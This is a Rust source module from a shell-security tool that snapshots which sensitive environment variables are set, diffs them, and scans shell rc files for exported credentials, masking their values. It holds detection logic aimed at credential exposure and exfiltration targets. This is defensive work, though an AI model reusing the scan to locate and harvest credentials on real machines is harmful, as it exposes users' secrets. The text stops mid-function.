//! Environment-variable lifecycle monitoring (M9 ch4).
//!
//! Backs `tirith env guard|diff|explain`. The sensitive-variable list comes from
//! the typed [`crate::sensitive_assets`] registry, with an optional user extension
//! from [`crate::policy::Policy::env_guard_sensitive_vars`] — one source of truth.
//!
//! Provides: [`EnvSnapshot`] (categorical variable-name presence only),
//! [`diff_sensitive`] (newly-set, legacy-comparable, or unresolved sensitive
//! vars since shell start),
//! [`explain_var`] (where a var is `export`ed — file+line, **value masked**),
//! and rule helpers for the three M9 ch4 [`RuleId`]s. The rules take
//! the set of set sensitive var names as a `&[String]` so they are unit-testable
//! without mutating `std::env` (the libc `setenv` race, PR #125).
//!
//! Why a child process writes the snapshot: the shell hook execs
//! `tirith env _snapshot` rather than piping env values (which would put secrets
//! on a pipe/tmpfile). The child reads its OWN inherited `std::env` and writes
//! variable names only — no value-derived hash, prefix, or raw value crosses an
//! argv boundary or persistence boundary.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use crate::tokenize::ShellType;
use crate::verdict::{Evidence, Finding, RuleId, Severity};

/// Compatibility re-export of the stable static slice exposed by the safe
/// command subsystem. Both accessors derive from the typed central registry.
pub use crate::safe_command::sensitive_env_vars;

/// Schema version for the on-disk env snapshot. Bump + migrate on layout
/// change (mirrors the persistence snapshot's forward-compat contract).
fn default_schema_version() -> u32 {
    1
}

const CURRENT_ENV_SNAPSHOT_SCHEMA_VERSION: u32 = 3;
const MAX_ENV_NAME_BYTES: usize = 256;
const REDACTED_ENV_NAME: &str = "[REDACTED:env_name]";

fn project_env_text(value: &str) -> String {
    let share_safe =
        crate::redact::redact_for_audience(value, crate::redact::ShareAudience::PublicPaste)
            .redacted_content;
    crate::redact::redact_blocked_output(&share_safe)
}

fn privacy_safe_env_name(name: &str) -> Option<&str> {
    (!name.is_empty() && name.len() <= MAX_ENV_NAME_BYTES && project_env_text(name) == name)
        .then_some(name)
}

fn projected_env_name(name: &str) -> String {
    privacy_safe_env_name(name)
        .unwrap_or(REDACTED_ENV_NAME)
        .to_string()
}

/// Leading hex chars returned by the legacy public [`value_hash8`] helper.
/// Snapshots no longer persist value-derived identifiers.
pub const VALUE_HASH_PREFIX_LEN: usize = 8;

/// One recorded variable in the snapshot. Every production constructor uses
/// categorical presence only (`value_hash8 = ""`). The field remains a String
/// for source compatibility, but snapshot serialization never persists a
/// value-derived identifier for any variable.
#[derive(Clone, PartialEq, Eq)]
pub struct SnapshotVar {
    /// The variable name (e.g. `AWS_SECRET_ACCESS_KEY`).
    pub name: String,
    /// Legacy compatibility field. Production construction, deserialization,
    /// debug formatting, and serialization always normalize it to empty.
    pub value_hash8: String,
}

impl std::fmt::Debug for SnapshotVar {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        formatter
            .debug_struct("SnapshotVar")
            .field("name", &projected_env_name(&self.name))
            .field("value_hash8", &"")
            .finish()
    }
}

impl Serialize for SnapshotVar {
    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: serde::Serializer,
    {
        use serde::ser::SerializeStruct as _;
        let mut state = serializer.serialize_struct("SnapshotVar", 2)?;
        state.serialize_field("name", &projected_env_name(&self.name))?;
        state.serialize_field("value_hash8", "")?;
        state.end()
    }
}

impl<'de> Deserialize<'de> for SnapshotVar {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        #[derive(Deserialize)]
        struct Wire {
            name: String,
            #[serde(default)]
            value_hash8: String,
        }
        let wire = Wire::deserialize(deserializer)?;
        let _ = wire.value_hash8;
        Ok(Self {
            value_hash8: String::new(),
            name: projected_env_name(&wire.name),
        })
    }
}

/// A point-in-time environment snapshot. Variables persist name presence only.
///
/// Contains no raw values and no value-derived hashes. Still written `0600` by
/// [`save_snapshot`] because the *set of names* is itself mildly sensitive (it
/// reveals which credentials you hold).
#[derive(Clone, PartialEq, Eq)]
pub struct EnvSnapshot {
    /// Snapshot schema version (forward-compat migrations).
    pub schema_version: u32,
    /// Unix epoch seconds the snapshot was taken (informational).
    pub taken_at: u64,
    /// Recorded variables keyed by name. A `BTreeMap` keeps the on-disk JSON
    /// deterministic.
    pub vars: BTreeMap<String, SnapshotVar>,
}

fn sanitized_snapshot_vars(vars: &BTreeMap<String, SnapshotVar>) -> BTreeMap<String, SnapshotVar> {
    vars.iter()
        .filter(|(name, _)| {
            privacy_safe_env_name(name).is_some()
                && crate::sensitive_assets::sensitive_env_kind(name)
                    != Some(crate::sensitive_assets::SensitiveEnvKind::RpcEndpoint)
        })
        .map(|(name, variable)| {
            let _ = variable;
            (
                name.clone(),
                SnapshotVar {
                    name: name.clone(),
                    value_hash8: String::new(),
                },
            )
        })
        .collect()
}

impl std::fmt::Debug for EnvSnapshot {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        formatter
            .debug_struct("EnvSnapshot")
            .field("schema_version", &self.schema_version)
            .field("taken_at", &self.taken_at)
            .field("vars", &sanitized_snapshot_vars(&self.vars))
            .finish()
    }
}

impl Serialize for EnvSnapshot {
    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: serde::Serializer,
    {
        use serde::ser::SerializeStruct as _;
        let mut state = serializer.serialize_struct("EnvSnapshot", 3)?;
        state.serialize_field("schema_version", &self.schema_version)?;
        state.serialize_field("taken_at", &self.taken_at)?;
        state.serialize_field("vars", &sanitized_snapshot_vars(&self.vars))?;
        state.end()
    }
}

impl<'de> Deserialize<'de> for EnvSnapshot {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        #[derive(Deserialize)]
        struct Wire {
            #[serde(default = "default_schema_version")]
            schema_version: u32,
            #[serde(default)]
            taken_at: u64,
            #[serde(default)]
            vars: BTreeMap<String, SnapshotVar>,
        }
        let wire = Wire::deserialize(deserializer)?;
        if wire.schema_version > CURRENT_ENV_SNAPSHOT_SCHEMA_VERSION {
            return Err(serde::de::Error::custom(
                "unsupported future env snapshot schema",
            ));
        }
        Ok(Self {
            schema_version: wire.schema_version,
            taken_at: wire.taken_at,
            vars: sanitized_snapshot_vars(&wire.vars),
        })
    }
}

impl Default for EnvSnapshot {
    fn default() -> Self {
        Self {
            schema_version: CURRENT_ENV_SNAPSHOT_SCHEMA_VERSION,
            taken_at: 0,
            vars: BTreeMap::new(),
        }
    }
}

impl EnvSnapshot {
    fn from_nonempty_env_names<I, K>(names: I, taken_at: u64) -> Self
    where
        I: IntoIterator<Item = K>,
        K: AsRef<str>,
    {
        let mut vars = BTreeMap::new();
        for name in names {
            let name = name.as_ref().to_string();
            if privacy_safe_env_name(&name).is_none() {
                continue;
            }
            if crate::sensitive_assets::sensitive_env_kind(&name)
                == Some(crate::sensitive_assets::SensitiveEnvKind::RpcEndpoint)
            {
                continue;
            }
            vars.insert(
                name.clone(),
                SnapshotVar {
                    name,
                    value_hash8: String::new(),
                },
            );
        }
        EnvSnapshot {
            schema_version: CURRENT_ENV_SNAPSHOT_SCHEMA_VERSION,
            taken_at,
            vars,
        }
    }

    fn migrate_presence_only(&mut self, _extra_sensitive: &[String]) -> bool {
        let mut changed = self.schema_version < CURRENT_ENV_SNAPSHOT_SCHEMA_VERSION;
        let previous_len = self.vars.len();
        // An RPC-named value can move from public to credential-bearing without
        // changing its name. Never let an untrusted/persisted baseline suppress
        // that transition; RPC state is therefore intentionally not baselined.
        self.vars.retain(|name, _| {
            privacy_safe_env_name(name).is_some()
                && crate::sensitive_assets::sensitive_env_kind(name)
                    != Some(crate::sensitive_assets::SensitiveEnvKind::RpcEndpoint)
        });
        changed |= self.vars.len() != previous_len;
        for (name, var) in &mut self.vars {
            if var.name != name.as_str() {
                var.name.clone_from(name);
                changed = true;
            }
            if !var.value_hash8.is_empty() {
                var.value_hash8.clear();
                changed = true;
            }
        }
        self.schema_version = CURRENT_ENV_SNAPSHOT_SCHEMA_VERSION;
        changed
    }

    /// Build a snapshot using the built-in registry privacy boundary.
    pub fn from_env_pairs<I, K, V>(pairs: I, taken_at: u64) -> Self
    where
        I: IntoIterator<Item = (K, V)>,
        K: AsRef<str>,
        V: AsRef<str>,
    {
        Self::from_env_pairs_with_sensitive(pairs, taken_at, &[])
    }

    /// Build a snapshot while preserving the stable caller/policy-sensitive
    /// argument. Every variable persists as name presence only; no value is
    /// hashed or converted to text.
    pub fn from_env_pairs_with_sensitive<I, K, V>(
        pairs: I,
        taken_at: u64,
        _extra_sensitive: &[String],
    ) -> Self
    where
        I: IntoIterator<Item = (K, V)>,
        K: AsRef<str>,
        V: AsRef<str>,
    {
        Self::from_nonempty_env_names(
            pairs
                .into_iter()
                .filter_map(|(name, value)| (!value.as_ref().is_empty()).then_some(name)),
            taken_at,
        )
    }

    /// Build a snapshot from the current process environment. Used by the
    /// hidden `tirith env _snapshot` child the shell hook execs.
    pub fn from_current_process() -> Self {
        Self::from_current_process_with_sensitive(&[])
    }

    pub fn from_current_process_with_sensitive(_extra_sensitive: &[String]) -> Self {
        let taken_at = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0);
        // `vars()` panics when either side of any inherited Unix entry is not
        // UTF-8 and unnecessarily converts every value into text. Snapshot v3
        // records non-empty name presence only: iterate OsStrings, inspect only
        // the value's empty bit (never decode it), and admit only names that are
        // valid Unicode and pass the same public-name projection used by every
        // other constructor.
        let names = std::env::vars_os().filter_map(|(name, value)| {
            if value.as_os_str().is_empty() {
                None
            } else {
                name.into_string().ok()
            }
        });
        Self::from_nonempty_env_names(names, taken_at)
    }
}

/// First [`VALUE_HASH_PREFIX_LEN`] hex chars of `SHA-256(value)`. An empty
/// value hashes to the empty string (so "set but empty" is distinguishable
/// from "set with a value").
pub fn value_hash8(value: &str) -> String {
    if value.is_empty() {
        return String::new();
    }
    use sha2::{Digest, Sha256};
    let digest = Sha256::digest(value.as_bytes());
    let hex = hex_encode(&digest);
    hex.chars().take(VALUE_HASH_PREFIX_LEN).collect()
}

fn hex_encode(bytes: &[u8]) -> String {
    let mut s = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        s.push(char::from_digit((b >> 4) as u32, 16).unwrap());
        s.push(char::from_digit((b & 0x0f) as u32, 16).unwrap());
    }
    s
}

/// How a sensitive variable differs between the shell-start snapshot and the
/// current environment.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum EnvDelta {
    /// Set now, absent in the snapshot.
    NewlySet,
    /// Legacy compatibility state supplied directly by a caller carried two
    /// different non-empty markers.
    ValueChanged,
    /// The variable was present at both observations, but at least one side has
    /// crossed the presence-only persistence boundary or belongs to another
    /// process-local comparison domain. Reporting this state is deliberately
    /// conservative: claiming "unchanged" would be false confidence.
    ValueComparisonUnavailable,
}

impl EnvDelta {
    pub fn as_str(self) -> &'static str {
        match self {
            EnvDelta::NewlySet => "newly_set",
            EnvDelta::ValueChanged => "value_changed",
            EnvDelta::ValueComparisonUnavailable => "value_comparison_unavailable",
        }
    }
}

/// One sensitive-variable difference reported by [`diff_sensitive`].
#[derive(Clone, Serialize, Deserialize)]
pub struct EnvDiffEntry {
    /// The sensitive variable name.
    #[serde(
        serialize_with = "serialize_projected_env_name",
        deserialize_with = "deserialize_projected_env_name"
    )]
    pub name: String,
    /// What changed.
    pub delta: EnvDelta,
}

impl std::fmt::Debug for EnvDiffEntry {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        formatter
            .debug_struct("EnvDiffEntry")
            .field("name", &projected_env_name(&self.name))
            .field("delta", &self.delta)
            .finish()
    }
}

fn serialize_projected_env_name<S>(name: &str, serializer: S) -> Result<S::Ok, S::Error>
where
    S: serde::Serializer,
{
    serializer.serialize_str(&projected_env_name(name))
}

fn deserialize_projected_env_name<'de, D>(deserializer: D) -> Result<String, D::Error>
where
    D: serde::Deserializer<'de>,
{
    String::deserialize(deserializer).map(|name| projected_env_name(&name))
}

enum MarkerComparison {
    Same,
    Changed,
    Unavailable,
}

fn compare_value_markers(previous: &str, current: &str) -> MarkerComparison {
    if previous.is_empty() || current.is_empty() {
        return MarkerComparison::Unavailable;
    }

    if previous == current {
        MarkerComparison::Same
    } else {
        MarkerComparison::Changed
    }
}

/// Report sensitive vars newly present, changed, or impossible to compare
/// safely since the shell-start snapshot. The map retains its legacy `String`
/// value type. Production snapshots and current maps carry empty presence
/// markers and therefore produce [`EnvDelta::ValueComparisonUnavailable`]
/// instead of a false "unchanged" result. Direct legacy callers that provide
/// two non-empty comparison markers retain their previous behavior.
pub fn diff_sensitive(
    snapshot: &EnvSnapshot,
    current: &BTreeMap<String, String>,
    sensitive: &[String],
) -> Vec<EnvDiffEntry> {
    let mut out = Vec::new();
    let names = sensitive
        .iter()
        .cloned()
        .chain(current.keys().cloned())
        .chain(
            snapshot
                .vars
                .keys()
                .filter(|name| {
                    crate::sensitive_assets::is_sensitive_env_name(name)
                        || sensitive
                            .iter()
                            .any(|candidate| candidate.eq_ignore_ascii_case(name))
                })
                .cloned(),
        )
        .filter(|name| privacy_safe_env_name(name).is_some())
        .collect::<std::collections::BTreeSet<_>>();
    for name in &names {
        let Some(cur_hash) = current.get(name) else {
            continue; // not set now → nothing appeared
        };
        if crate::sensitive_assets::sensitive_env_kind(name)
            == Some(crate::sensitive_assets::SensitiveEnvKind::RpcEndpoint)
        {
            out.push(EnvDiffEntry {
                name: name.clone(),
                delta: EnvDelta::NewlySet,
            });
            continue;
        }
        match snapshot.vars.get(name) {
            None => out.push(EnvDiffEntry {
                name: name.clone(),
                delta: EnvDelta::NewlySet,
            }),
            Some(prev) => match compare_value_markers(&prev.value_hash8, cur_hash) {
                MarkerComparison::Same => {}
                MarkerComparison::Changed => out.push(EnvDiffEntry {
                    name: name.clone(),
                    delta: EnvDelta::ValueChanged,
                }),
                MarkerComparison::Unavailable => out.push(EnvDiffEntry {
                    name: name.clone(),
                    delta: EnvDelta::ValueComparisonUnavailable,
                }),
            },
        }
    }
    // Deterministic output regardless of the `sensitive` list ordering.
    out.sort_by(|a, b| a.name.cmp(&b.name));
    out
}

/// The set sensitive vars in this process as a presence-only map. Empty-valued
/// vars are treated as unset. Values are never converted to text or hashed.
pub fn current_sensitive_in_process(sensitive: &[String]) -> BTreeMap<String, String> {
    let mut map = BTreeMap::new();
    for (name, value) in std::env::vars_os() {
        let Ok(name) = name.into_string() else {
            continue;
        };
        let policy_sensitive = sensitive
            .iter()
            .any(|candidate| candidate.eq_ignore_ascii_case(&name));
        let registry_sensitive = match crate::sensitive_assets::sensitive_env_kind(&name) {
            Some(crate::sensitive_assets::SensitiveEnvKind::RpcEndpoint) => value
                .to_str()
                .map(|value| crate::sensitive_assets::is_sensitive_env_assignment(&name, value))
                .unwrap_or(true),
            Some(kind) => kind.is_secret(),
            None => false,
        };
        if !value.is_empty()
            && (registry_sensitive || policy_sensitive)
            && privacy_safe_env_name(&name).is_some()
        {
            map.insert(name, String::new());
        }
    }
    map
}

/// The sensitive var NAMES currently set (non-empty) in this process, in the
/// order they appear in `sensitive`. This is the production-path argument to
/// the engine rules — passing it explicitly (rather than reading `std::env`
/// inside the rule) keeps the rule unit-testable without an env mutation.
pub fn sensitive_env_set_in_process(sensitive: &[String]) -> Vec<String> {
    current_sensitive_in_process(sensitive)
        .into_keys()
        .collect()
}

/// Merge the built-in sensitive list with a user-supplied extension
/// (`policy.env_guard_sensitive_vars`), de-duplicated, built-ins first then
/// the extras in their given order. This is the single place the two sources
/// are combined.
pub fn effective_sensitive_vars(extra: &[String]) -> Vec<String> {
    let mut out: Vec<String> = sensitive_env_vars()
        .iter()
        .copied()
        .map(str::to_string)
        .collect();
    for e in extra {
        let e = e.trim();
        if privacy_safe_env_name(e).is_some() && !out.iter().any(|x| x == e) {
            out.push(e.to_string());
        }
    }
    out
}

// ─── explain ─────────────────────────────────────────────────────────────────

/// Where a variable is `export`ed: a source file + 1-based line number.
#[derive(Clone, Serialize, Deserialize)]
pub struct EnvSource {
    /// Display path of the rc/profile file.
    #[serde(
        serialize_with = "serialize_projected_text",
        deserialize_with = "deserialize_projected_text"
    )]
    pub file: String,
    /// 1-based line number of the `export`/`set` directive.
    pub line: usize,
    /// The directive line after value masking and mandatory public projection.
    /// Sensitive assignment shapes may therefore collapse to a categorical
    /// `[REDACTED…]` marker. The raw value is never read into this string.
    #[serde(
        serialize_with = "serialize_projected_text",
        deserialize_with = "deserialize_projected_text"
    )]
    pub masked_line: String,
}

fn serialize_projected_text<S>(value: &str, serializer: S) -> Result<S::Ok, S::Error>
where
    S: serde::Serializer,
{
    serializer.serialize_str(&project_env_text(value))
}

fn deserialize_projected_text<'de, D>(deserializer: D) -> Result<String, D::Error>
where
    D: serde::Deserializer<'de>,
{
    String::deserialize(deserializer).map(|value| project_env_text(&value))
}

impl std::fmt::Debug for EnvSource {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        formatter
            .debug_struct("EnvSource")
            .field("file", &project_env_text(&self.file))
            .field("line", &self.line)
            .field("masked_line", &project_env_text(&self.masked_line))
            .finish()
    }
}

/// Result of [`explain_var`]: every rc/profile location that exports `name`,
/// plus whether it is currently set in the live process environment.
#[derive(Clone, Default, Serialize, Deserialize)]
pub struct EnvExplain {
    /// The variable queried.
    #[serde(
        serialize_with = "serialize_projected_env_name",
        deserialize_with = "deserialize_projected_env_name"
    )]
    pub name: String,
    /// `true` if the variable is set in the current process environment
    /// (regardless of where — could be inherited, set inline, etc.).
    pub set_in_process: bool,
    /// rc/profile files that export it, with line numbers (value masked).
    pub sources: Vec<EnvSource>,
}

impl std::fmt::Debug for EnvExplain {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        formatter
            .debug_struct("EnvExplain")
            .field("name", &projected_env_name(&self.name))
            .field("set_in_process", &self.set_in_process)
            .field("sources", &self.sources)
            .finish()
    }
}

/// Explain where `name` is set: scans the user's rc/profile files for an
/// `export`/`set -x`/`$env:` directive and reports file + line (value masked),
/// plus whether it is currently set in this process.
///
/// **The value is never read or printed** — [`mask_assignment`] replaces it
/// with `****`, after which mandatory public projection may collapse the whole
/// sensitive assignment to a categorical `[REDACTED…]` marker.
pub fn explain_var(name: &str) -> EnvExplain {
    let home = home::home_dir();
    explain_var_in(name, home.as_deref())
}

/// Testable core of [`explain_var`]: scan rc files under `home`.
pub fn explain_var_in(name: &str, home: Option<&Path>) -> EnvExplain {
    let Some(name) = privacy_safe_env_name(name) else {
        return EnvExplain {
            name: REDACTED_ENV_NAME.to_string(),
            set_in_process: false,
            sources: Vec::new(),
        };
    };
    let set_in_process = std::env::var_os(name).is_some();
    let mut sources = Vec::new();
    if let Some(home) = home {
        for rel in RC_FILES {
            let path = home.join(rel);
            scan_rc_for_export(&path, name, &mut sources);
        }
    }
    EnvExplain {
        name: name.to_string(),
        set_in_process,
        sources,
    }
}

/// Scan rc/profile files for `export`s of any SENSITIVE var, emitting a
/// [`RuleId::EnvSensitivePersistedInShellRc`] (High) finding per (var, location).
/// The value is NEVER read or printed; evidence carries the masked directive
/// line. `sensitive` is the effective name list; production passes
/// `home::home_dir()`, tests a tempdir root.
pub fn scan_rc_for_sensitive_exports(sensitive: &[String], home: Option<&Path>) -> Vec<Finding> {
    let mut findings = Vec::new();
    let Some(home) = home else {
        return findings;
    };
    for rel in RC_FILES {
        let path = home.join(rel);
        let Ok(contents) = std::fs::read_to_string(&path) else {
            continue;
        };
        for (index, raw) in contents.lines().enumerate() {
            let line = raw.trim();
            if line.is_empty() || line.starts_with('#') {
                continue;
            }
            let Some(name) = exported_var_name(line) else {
                continue;
            };
            let Some(name) = privacy_safe_env_name(name) else {
                continue;
            };
            let registry_sensitive = crate::sensitive_assets::is_sensitive_env_name(name)
                || exported_var_value(line, name).is_some_and(|value| {
                    crate::sensitive_assets::is_sensitive_env_assignment(name, value)
                });
            if !registry_sensitive
                && !sensitive
                    .iter()
                    .any(|candidate| candidate.eq_ignore_ascii_case(name))
            {
                continue;
            }
            let masked_line = mask_assignment(line, name);
            let line_number = index + 1;
            let file = path.display().to_string();
            findings.push(Finding {
                rule_id: RuleId::EnvSensitivePersistedInShellRc,
                severity: Severity::High,
                title: format!("Sensitive env var {name} exported in a shell rc/profile"),
                description: format!(
                    "{name} is exported in {file} (line {line_number}). A credential persisted in shell \
                     config loads into every shell and is a common exfiltration target. \
                     Load it on demand instead. (value masked: {masked_line})"
                ),
                evidence: vec![Evidence::Text {
                    detail: format!("{file}:{line_number} {masked_line}"),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        }
    }
    findings
}

/// rc/profile files scanned by [`explain_var`]. Mirrors the persistence
/// module's shell-rc set so the two surfaces agree on "where shell config
/// lives".
const RC_FILES: &[&str] = &[
    ".bashrc",
    ".bash_profile",
    ".zshrc",
    ".zprofile",
    ".zshenv",
    ".profile",
    ".config/fish/config.fish",
];

/// Append every `export`/`set`/`$env:` line in `path` that assigns `name`,
/// with the value masked. Missing / unreadable files are silently skipped.
fn scan_rc_for_export(path: &Path, name: &str, out: &mut Vec<EnvSource>) {
    let Ok(contents) = std::fs::read_to_string(path) else {
        return;
    };
    for (idx, raw) in contents.lines().enumerate() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        if line_exports_var(line, name) {
            out.push(EnvSource {
                file: project_env_text(&path.display().to_string()),
                line: idx + 1,
                masked_line: project_env_text(&mask_assignment(line, name)),
            });
        }
    }
}

/// `true` when `line` assigns/exports the variable `name`. Recognizes the
/// common POSIX, fish, and PowerShell shapes:
///   * `export NAME=…`, `NAME=…`, `declare -x NAME=…`, `typeset -x NAME=…`
///   * `set -x NAME …` (fish), `set --export NAME …`
///   * `setenv NAME …` (csh/tcsh)
///   * `$env:NAME = …` (PowerShell)
fn line_exports_var(line: &str, name: &str) -> bool {
    exported_var_name(line).is_some_and(|candidate| candidate == name)
}

fn exported_var_name(line: &str) -> Option<&str> {
    // PowerShell `$env:NAME = ...`
    if let Some(rest) = line.strip_prefix("$env:") {
        let var = rest.split(['=', ' ', '\t']).next().unwrap_or("");
        return (!var.is_empty()).then_some(var);
    }

    let mut toks = line.split_whitespace();
    let first = toks.next()?;

    // fish: `set -x NAME ...` / `set --export NAME ...` / `setenv NAME ...`
    if first == "set" {
        for t in toks {
            if t.starts_with('-') {
                continue; // flag (-x, --export, -gx, …)
            }
            return Some(t.trim_end_matches('='));
        }
        return None;
    }
    if first == "setenv" {
        return toks.next();
    }

    // POSIX: optional leading `export` / `declare -x` / `typeset -x`, then
    // `NAME=...`. Find the token carrying the `NAME=` assignment.
    let assign_tok = match first {
        "export" | "declare" | "typeset" | "local" | "readonly" => {
            // Skip any flags, take the first `NAME=...`-shaped token.
            line.split_whitespace()
                .skip(1)
                .find(|t| !t.starts_with('-'))
        }
        _ => Some(first),
    };
    assign_tok.and_then(|token| token.split_once('=').map(|(name, _)| name))
}

fn exported_var_value<'a>(line: &'a str, name: &str) -> Option<&'a str> {
    if line.starts_with("$env:") {
        return line.split_once('=').map(|(_, value)| value.trim());
    }
    let token = line.split_whitespace().find(|token| {
        token
            .trim_end_matches('=')
            .split_once('=')
            .map_or(*token, |(candidate, _)| candidate)
            == name
    })?;
    let name_offset = line.find(token)?;
    let after_name = &line[name_offset + name.len()..];
    Some(after_name.strip_prefix('=').unwrap_or(after_name).trim())
}

/// Replace the assigned value of `name` in `line` with `****`. Operates on the
/// already-trimmed directive line. The value bytes are never copied into the
/// result.
fn mask_assignment(line: &str, name: &str) -> String {
    // PowerShell `$env:NAME = value`
    if line.starts_with("$env:") {
        if let Some(eq) = line.find('=') {
            return format!("{} ****", &line[..eq + 1]);
        }
    }
    // fish `set -x NAME value...` / `setenv NAME value`
    let mut toks = line.split_whitespace();
    if let Some(first) = toks.next() {
        if first == "set" || first == "setenv" {
            // Rebuild: everything up to and including the NAME token, then ****.
            let mut prefix: Vec<&str> = vec![first];
            let mut found_name = false;
            for t in line.split_whitespace().skip(1) {
                prefix.push(t);
                if t == name {
                    found_name = true;
                    break;
                }
            }
            if found_name {
                return format!("{} ****", prefix.join(" "));
            }
        }
    }
    // POSIX `... NAME=value` — mask everything after the first `=` that
    // belongs to NAME.
    if let Some(pos) = find_name_assign_eq(line, name) {
        return format!("{}****", &line[..pos + 1]);
    }
    // Fallback: we matched the var but couldn't locate the value boundary —
    // return a fully-masked placeholder rather than risk echoing the value.
    format!("{name}=****")
}

/// Byte offset of the `=` that assigns `name` in a POSIX directive line, or
/// `None`. Scans whitespace-delimited tokens for `NAME=` and returns the
/// offset of that `=` within `line`.
fn find_name_assign_eq(line: &str, name: &str) -> Option<usize> {
    let mut search_from = 0;
    for tok in line.split_whitespace() {
        // Locate this token's start in the original line.
        let tok_start = line[search_from..].find(tok)? + search_from;
        search_from = tok_start + tok.len();
        if let Some((lhs, _)) = tok.split_once('=') {
            if lhs == name {
                return Some(tok_start + lhs.len());
            }
        }
    }
    None
}

// ─── on-disk snapshot ──────────────────────────────────────────────────────

/// Default snapshot path: `state_dir()/env_snapshot.json`.
pub fn snapshot_path() -> Option<PathBuf> {
    crate::policy::state_dir().map(|d| d.join("env_snapshot.json"))
}

/// Load the env snapshot from `path`, returning a default (empty) snapshot if
/// the file is missing or unparseable — a missing snapshot is the expected
/// "no shell-start baseline yet" state, not an error.
pub fn load_snapshot(path: &Path) -> EnvSnapshot {
    load_snapshot_with_sensitive(path, &[])
}

/// Load and migrate an environment snapshot. Legacy value-derived markers are
/// discarded for every variable immediately and never returned. The
/// caller/policy-sensitive argument is retained for API compatibility.
pub fn load_snapshot_with_sensitive(path: &Path, extra_sensitive: &[String]) -> EnvSnapshot {
    load_snapshot_and_migrate(path, extra_sensitive).unwrap_or_default()
}

/// Checked normal-workflow loader. Legacy value-derived markers are removed for
/// every variable and the upgraded schema is atomically persisted before it is
/// returned. A parse, read, or migration-write failure is surfaced so callers
/// can fail safely instead of continuing from an unpersisted or empty baseline.
pub fn load_snapshot_and_migrate(
    path: &Path,
    extra_sensitive: &[String],
) -> std::io::Result<EnvSnapshot> {
    load_snapshot_and_migrate_with(path, extra_sensitive, save_snapshot_with_sensitive)
}

fn load_snapshot_and_migrate_with<F>(
    path: &Path,
    extra_sensitive: &[String],
    persist: F,
) -> std::io::Result<EnvSnapshot>
where
    F: FnOnce(&Path, &EnvSnapshot, &[String]) -> std::io::Result<()>,
{
    let raw = match std::fs::read_to_string(path) {
        Ok(raw) => raw,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
            return Ok(EnvSnapshot::default());
        }
        Err(error) => return Err(error),
    };
    let raw_value = serde_json::from_str::<serde_json::Value>(&raw)
        .map_err(|error| std::io::Error::new(std::io::ErrorKind::InvalidData, error))?;
    let schema_version = raw_value
        .get("schema_version")
        .and_then(serde_json::Value::as_u64)
        .unwrap_or_else(|| u64::from(default_schema_version()));
    if schema_version > u64::from(CURRENT_ENV_SNAPSHOT_SCHEMA_VERSION) {
        // Do not deserialize-and-rewrite a schema owned by a newer binary:
        // unknown fields must remain byte-for-byte intact.
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "unsupported future env snapshot schema",
        ));
    }
    let raw_requires_presence_migration = raw_value
        .get("vars")
        .and_then(serde_json::Value::as_object)
        .is_some_and(|variables| {
            variables.iter().any(|(map_name, variable)| {
                let declared_name = variable
                    .get("name")
                    .and_then(serde_json::Value::as_str)
                    .unwrap_or(map_name);
                let has_nonempty_hash = variable
                    .get("value_hash8")
                    .and_then(serde_json::Value::as_str)
                    .is_some_and(|hash| !hash.is_empty());
                privacy_safe_env_name(map_name).is_none()
                    || privacy_safe_env_name(declared_name).is_none()
                    || declared_name != map_name
                    || has_nonempty_hash
                    || crate::sensitive_assets::sensitive_env_kind(map_name)
                        == Some(crate::sensitive_assets::SensitiveEnvKind::RpcEndpoint)
            })
        });
    let mut snapshot: EnvSnapshot = serde_json::from_str(&raw)
        .map_err(|error| std::io::Error::new(std::io::ErrorKind::InvalidData, error))?;
    let migrated = snapshot.migrate_presence_only(extra_sensitive);
    if raw_requires_presence_migration || migrated {
        persist(path, &snapshot, extra_sensitive)?;
    }
    Ok(snapshot)
}

/// Persist `snapshot` to `path` via a same-directory temporary file and atomic
/// replacement. On Unix the temporary file is mode `0600` before any snapshot
/// bytes are written, so there is no world-readable or truncate-in-place window.
pub fn save_snapshot(path: &Path, snapshot: &EnvSnapshot) -> std::io::Result<()> {
    save_snapshot_with_sensitive(path, snapshot, &[])
}

/// Persist a snapshot after enforcing presence-only storage for every variable.
/// This sink-side guard also protects callers that constructed or deserialized
/// an `EnvSnapshot` directly. The extra-name argument remains API-compatible.
pub fn save_snapshot_with_sensitive(
    path: &Path,
    snapshot: &EnvSnapshot,
    extra_sensitive: &[String],
) -> std::io::Result<()> {
    if snapshot.schema_version > CURRENT_ENV_SNAPSHOT_SCHEMA_VERSION {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "unsupported future env snapshot schema",
        ));
    }
    match std::fs::read_to_string(path) {
        Ok(existing) => {
            if serde_json::from_str::<serde_json::Value>(&existing)
                .ok()
                .and_then(|value| {
                    value
                        .get("schema_version")
                        .and_then(serde_json::Value::as_u64)
                })
                .is_some_and(|version| version > u64::from(CURRENT_ENV_SNAPSHOT_SCHEMA_VERSION))
            {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::InvalidData,
                    "refusing to replace a future env snapshot schema",
                ));
            }
        }
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
        Err(error) => return Err(error),
